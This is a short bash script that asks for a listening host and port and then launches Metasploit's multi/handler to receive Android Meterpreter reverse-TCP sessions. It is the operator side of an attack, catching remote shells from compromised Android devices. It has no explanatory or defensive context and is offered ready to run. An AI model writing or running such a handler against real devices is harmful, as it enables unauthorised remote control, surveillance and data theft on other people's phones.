#!/bin/bash
read -rp "LHOST: " lh
read -rp "LPORT: " lp
msfconsole -q -x "use multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $lh; set LPORT $lp; exploit"
